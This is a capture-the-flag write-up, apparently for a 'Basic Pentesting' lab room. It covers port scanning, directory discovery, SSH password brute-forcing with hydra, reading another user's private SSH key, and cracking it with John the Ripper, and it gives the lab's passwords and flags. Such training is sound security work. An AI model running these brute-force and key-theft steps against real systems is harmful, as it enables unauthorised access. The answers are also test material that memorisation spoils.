#Basic Pentesting
##[Task 1] Web App Testing and Privilege Escalation 

###1 	Deploy the machine and connect to our network
Clicked on deploy
Connect to vpn
```
sudo openvpn yourOVPNfile.ovpn
```

Got the ip = <ip>

###2 	Find the services exposed by the machine
Run a nmap scan to get all the open ports

```
nmap -sV -sC <ip>
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

###3 	What is the name of the hidden directory on the web server(enter name without /)?
To do this we can run dirbuster, supply a dir dictonary and press start.

```
dirbuster http://<ip>
```
Dir	/icons/	403	465
Dir	/development/	200	1320

**Answer**
development

###4 	User brute-forcing to find the username & password

```
enum4linux -v <ip>
```
**Result**
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

###5 	What is the username?
After having a look in http://<ip>/development we found out that jan has a week password.

**Answer**
jan

###6 	What is the password?
Bruteforceing jan's week password using rockyou word list.
```
hydra -l jan -P rockyou.txt ssh://<ip>
ctrl+C
hydra -R (to speed it up)
```
Minimum Password Length: 5
[22][ssh] host: <ip>  login: jan   password: armando

**Answer**
armando

###7 	What service do you use to access the server(answer in abbreviation in all caps)?
Did a BF with hydra on SSH

**Answer**
SSH

###8 	Enumerate the machine to find any vectors for privilege escalation
Send the linpeas script to jan. Make it an excecutible. And run it.
```
scp linpeas.sh jan@<ip>:/dev/shm
chmod +x linpeas.sh
./linpeas.sh
```
Here we can see that we have access to read kay's **id_rsa** file.

###9 	What is the name of the other user you found(all lower case)?

**Answer**
kay

###10 	If you have found another user, what can you do with this information?
Copy the rsa key. Run ssh2john on that file so JohnTheRipper can read it. BF using rockyou word list.
```
cat /home/kay/.ssh/id_rsa
/usr/share/john/ssh2john.py
sudo john thm/BasicPentesting/id_rsa_kay_tojohn.txt --wordlist rockyou.txt
```
beeswax          (id_rsa_kay)

**Answer**
beeswax

###11 	What is the final password you obtain?
Login to the server using kay's credentials. Print out the pass.bak file.
```
cat pass.bak
```

**Answer**
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
